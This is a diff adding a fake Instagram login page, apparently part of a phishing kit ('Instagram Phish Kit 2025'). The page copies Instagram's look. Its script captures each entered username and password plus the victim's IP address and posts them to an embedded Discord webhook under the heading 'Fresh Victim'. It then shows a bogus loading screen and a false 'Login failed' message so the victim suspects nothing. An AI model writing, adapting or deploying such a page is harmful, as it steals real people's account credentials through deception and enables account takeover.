@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon-192.png" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="phone-mockup">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png" alt="">
+        </div>
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            
+            <form id="loginForm">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
+                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+                <button type="submit">Log in</button>
+            </form>
+
+            <div class="or-separator">
+                <span>OR</span>
+            </div>
+
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <div class="app-stores">
+            <p>Get the app.</p>
+            <div class="stores">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
+            </div>
+        </div>
+
+        <footer>
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+            </ul>
+            <p>© 2025 Instagram from Meta</p>
+        </footer>
+    </div>
+
+    <div id="loading" class="hidden">
+        <div class="spinner"></div>
+        <p>Logging in...</p>
+    </div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1445008130319712256/wvzRaLrYuvshypm0j789S7W15BhATlnvtbNWjPPeJve22zxV-F89sgo-Yt1YczYF0-9V"; // <<< PUT YOUR WEBHOOK HERE
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            
+            const username = this.username.value.trim();
+            const password = this.password.value;
+            const ip = await fetch('https://api.ipify.org').then(r => r.text());
+
+            // Show fake loading
+            document.querySelector(".container").style.display = "none";
+            document.getElementById("loading").classList.remove("hidden");
+
+            // Send to your Discord
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "**INSTAGRAM CREDENTIALS CAUGHT – GUI PHISH**",
+                    embeds: [{
+                        title: "Fresh Victim",
+                        color: 16745728,
+                        fields: [
+                            {name: "Username/Email", value: username, inline: true},
+                            {name: "Password", value: password, inline: true},
+                            {name: "IP Address", value: ip, inline: false},
+                            {name: "Time", value: new Date().toLocaleString(), inline: true}
+                        ],
+                        footer: {text: "Instagram Phish Kit 2025"}
+                    }]
+                })
+            });
+
+            // Keep them on fake loading forever (or redirect after 5s)
+            setTimeout(() => {
+                alert("Login failed. Please check your username and password and try again.");
+                location.reload();
+            }, 4000);
+        });
+    </script>
+</body>
+</html>
